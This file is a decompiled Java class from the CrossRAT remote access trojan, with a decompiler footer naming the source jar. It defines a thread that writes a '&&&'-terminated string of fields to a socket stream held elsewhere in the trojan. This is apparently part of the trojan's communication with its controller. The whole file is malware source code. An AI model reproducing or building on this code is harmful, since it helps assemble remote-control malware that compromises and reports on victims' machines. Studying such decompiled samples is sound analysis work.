package crossrat;

import java.io.DataOutputStream;
import java.io.InterruptedIOException;
import java.net.Socket;

final class g
  extends Thread
{
  public final void run()
  {
    try
    {
      DataOutputStream localDataOutputStream;
      (localDataOutputStream = new DataOutputStream(k.k.getOutputStream())).writeBytes(k.g + k.d + k.x + k.d + "&&&");
      return;
    }
    catch (InterruptedIOException localInterruptedIOException)
    {
      Thread.currentThread().interrupt();
      return;
    }
    catch (Exception localException)
    {
      if (!isInterrupted()) {
        localException.printStackTrace();
      }
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\g.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */